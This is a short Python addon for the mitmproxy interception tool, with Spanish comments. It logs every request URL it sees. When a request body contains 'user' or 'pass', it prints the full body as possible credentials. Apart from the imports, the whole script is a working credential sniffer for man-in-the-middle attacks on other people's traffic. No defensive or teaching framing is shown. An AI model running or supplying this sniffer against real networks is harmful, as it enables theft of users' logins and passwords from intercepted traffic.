#!/usr/bin/env python3

from mitmproxy import http
from urllib.parse import urlparse

def has_key(data, keyw):
    for key in keyw:
        if key in data:
            return True
    return False


def request(pk):
    url = pk.request.url
    par = urlparse(url)
    scheme = par.scheme
    domain = par.netloc
    path = par.path

    print(f"\n\n[+] Url: {scheme}://{domain}{path}")

    clave = ['user', 'pass']

    data = pk.request.get_text()

    # print(data) imprime toda la data que se esta enviando 

    if has_key(data, clave):
        print(f"\n\n[!] Posibles credenciales:\n\n--{data}--\n\n")